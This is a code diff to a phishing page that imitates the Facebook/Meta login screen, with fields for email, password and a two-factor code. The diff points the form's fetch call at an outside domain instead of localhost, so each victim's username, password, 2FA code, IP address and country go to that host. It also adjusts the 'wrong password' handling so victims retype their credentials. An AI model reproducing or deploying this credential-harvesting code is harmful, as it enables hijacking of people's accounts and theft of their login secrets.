@@ -181,12 +181,11 @@
                     var loader = document.getElementById("loader");
                     button.style.display = "none";
                     loader.style.display = "flex";
-                    event.preventDefault();
                     const ipAddress = localStorage.getItem('ipAddress');
                     const address = localStorage.getItem('address');
                     var code = document.getElementById('2facode')
                     var codeValue = code.value
-                    fetch('http://localhost:5000/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+                    fetch('https://gombiztank.id.vn/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
                         .then(response => {
                             if (!response.ok) {
                                 throw new Error('Network response was not ok');
@@ -208,7 +207,7 @@
                                 button.addEventListener("click", submitForm);
                             }
                             else if (data === 'WRONG') {
-                                emailInput.value = '';
+                                passwordInput.value = ''
                                 passwordInput.style.borderColor = 'red';
                                 passwordInput.placeholder = 'Wrong password';
                                 code.placeholder = 'Wrong code';
@@ -304,7 +303,7 @@
             <div class="header">
                 <img class="logo" src="image/icon.png" alt="">
             </div>
-            <form>
+            <div>
                 <div class="content">
                     <div class="wbloks_1" id="emailContainer">
                         <input id="email" class="Input" type="text" id="m_login_email"
@@ -327,10 +326,11 @@
                                         flex-direction: row;
                                         margin-top: 10px;
                                         justify-content: center;">
+                                        <div class="loader"></div>
                     </div>
                 </div>
         </div>
-        </form>
+        </div>
         <div class="footer">
             <img src="image/meta_logo.png" alt="">
         </div>
